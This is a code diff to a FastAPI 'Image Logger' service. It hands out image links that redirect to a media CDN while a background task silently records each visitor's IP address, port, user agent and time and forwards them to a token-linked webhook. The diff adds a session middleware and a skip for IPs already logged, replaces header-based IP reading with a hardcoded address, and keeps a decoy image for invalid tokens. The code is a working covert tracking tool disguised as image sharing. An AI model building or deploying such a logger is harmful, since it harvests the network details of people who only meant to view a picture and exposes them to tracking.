@@ -55,10 +55,16 @@ thumnail= "https://media-ten.z-cdn.me/"
 
 http middleware to get IP
 '''
+@app.middleware("http") 
+async def db_session_middleware(request: Request, call_next): 
+    request.state.db = Session() 
+    response = await call_next(request) 
+    request.state.db.close() 
+    return response 
 @app.middleware("http")
 async def log_ip(request: Request, call_next):
-    ip = request.headers['x-real-ip']
-    # ip= '116.99.176.40'
+    # ip = request.headers['x-real-ip']
+    ip= '123.18.143.95'
     port= request.client.port
     timestamp = datetime.now(pytz.timezone('Asia/Ho_Chi_Minh'))
     request.state.ip = ip
@@ -76,11 +82,11 @@ async def redirect_image(background_tasks: BackgroundTasks,request: Request, url
     timestamp = request.state.timestamp
     port = request.state.port
     webhooks_url= curd.get_webhooks_by_token(db=db,token=token)
-    print(f'{urlpath}')
-    if not urlpath or not imagename or token==None or not curd.check_exists_token(db, token=token):
-        background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Cảnh báo server configuration',db=db)
-        return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
-    background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
+    if not curd.check_ip_exist(ip, db=db):
+        if not urlpath or not imagename or token==None or not curd.check_exists_token(db, token=token):
+            background_tasks.add_task(CheckIP, ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Cảnh báo server configuration',db=db)
+            return RedirectResponse(f"https://media-ten.z-cdn.me/yYs3rlgP4qQAAAAF/keanu-keanu-reeves.png")
+        background_tasks.add_task(CheckIP,ip, url=webhooks_url,useragent=user_agent, token=token, timestamp=timestamp, port=port, filename=imagename, url_thumbnail=f"https://media-ten.z-cdn.me/{urlpath}/{imagename}", botname='Image Logger', db=db)
     return RedirectResponse(f"https://media-ten.z-cdn.me/{urlpath}/{imagename}")
 @app.get("/")
 async def read_root(request: Request, user_agent: str = Header(None, convert_underscores=True), db: Session = Depends(get_db)):
